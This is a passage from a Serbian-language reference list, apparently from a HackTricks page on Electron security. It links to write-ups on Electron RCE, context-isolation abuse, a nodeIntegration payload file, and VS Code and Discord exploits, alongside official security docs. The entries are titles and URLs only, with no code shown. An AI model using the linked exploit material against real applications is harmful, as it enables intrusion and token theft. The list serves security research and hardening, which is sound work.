- [3] [Electron: Zloupotreba nedostatka izolacije konteksta - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Radionica o hakovanju modernih desktop aplikacija pomoću XSS-a i RCE-a](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - odabrana lista resursa o (ne)bezbednosti Electron.js-a](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Zloupotreba Electron API-ja: prvi izbor napadača](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Electron nodeIntegration RCE payload-i](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE jednim klikom u Electron aplikacijama](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Opasnosti Electron-ovog shell.openExternal() - brojni načini za udaljeno izvršavanje koda](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Dozvolite proizvoljne URL-ove, očekujte proizvoljno izvršavanje koda](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Postizanje RCE-a u poznatom japanskom alatu za ćaskanje pomoću zastarele Electron funkcije](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - udaljeno izvršavanje koda](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - udaljeno izvršavanje koda u ograničenom režimu (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Krađa GitHub tokena jednim klikom putem ubacivanja događaja tastature u VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [VS Code issue #319593: Webview-ovi mogu da aktiviraju proizvoljne prečice na tastaturi u glavnom radnom okruženju](https://github.com/microsoft/vscode/issues/319593)
- [16] [VS Code PR #319705: potvrda otvaranja notebook-a i prestanak prihvatanja konteksta installExtension-a koji je dostavio pozivalac](https://github.com/microsoft/vscode/pull/319705)
- [17] [VS Code PR #319813: blokiranje programskog ponovnog slanja pritisaka tastera/klikova iz webview-a u notebook webview-ovima](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / ekstenzije lokalnog radnog prostora](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: Kako sam hakovao sve glavne IDE-ove za 2 nedelje](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Preuzimanje kontrole nad popularnim desktop aplikacijama uz otkrivanje nove površine za napad u Electron-u](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Electron bezbednost](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Electron BrowserWindow webPreferences](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: Obrnuti inženjering bilo čega](https://github.com/morluto/rea)
- [24] [REA rekonstrukcija JavaScript artefakata](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [REA tokovi rada JavaScript aplikacija kroz različite slojeve](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
